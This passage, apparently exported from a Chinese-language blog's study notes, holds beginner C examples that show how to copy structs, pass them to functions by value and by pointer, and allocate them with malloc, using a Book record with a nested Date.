printf(&quot;作者：%s\\n&quot;, (*pt).author);\n    printf(&quot;售价：%.2f\\n&quot;, (*pt).price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, (*pt).date.year, (*pt).date.month, (*pt).date.day);\n    printf(&quot;出版社：%s\\n&quot;, (*pt).publisher);\n\n    return 0;\n&#125;\n\n传递结构体变量#include &lt;stdio.h&gt;\n\nint main(void)\n&#123;\n    struct Test\n    &#123;\n        int x;\n        int y;\n    &#125;t1, t2;\n\n    t1.x &#x3D; 3;\n    t1.y &#x3D; 4;\n\n    t2 &#x3D; t1;\n\n    printf(&quot;t2.x &#x3D; %d, t2.y &#x3D; %d \\n&quot;, t2.x, t2.y);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nstruct Book getInput(struct Book book);\n\nstruct Book getInput(struct Book book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book.date.year, &amp;book.date.month, &amp;book.date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    return book;\n&#125;\n\nvoid printBook(struct Book book);\n\nvoid printBook(struct Book book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    b1 &#x3D; getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    b2 &#x3D; getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    return 0;\n&#125;\n\n\n传递指向结构体变量的指针· 一切为了效率\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(&amp;b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(&amp;b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(&amp;b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(&amp;b2);\n\n    return 0;\n&#125;\n\n动态申请结构体使用malloc函数为结构体分配存储空间\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book *b1,*b2;\n\n    b1 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n    b2 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (b1 &#x3D;&#x3D; NULL || b2 &#x3D;&#x3D; NULL)&#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：\\n&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：\\n&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    free(b1);\n    free(b2);\n\n    return 0;\n&#125;","slug":"c语言_01","date":"2023-04-23T03:20:34.000Z","categories_index":"学习笔记","tags_index":"c语言基础","author_index":"南瓜の无名"}]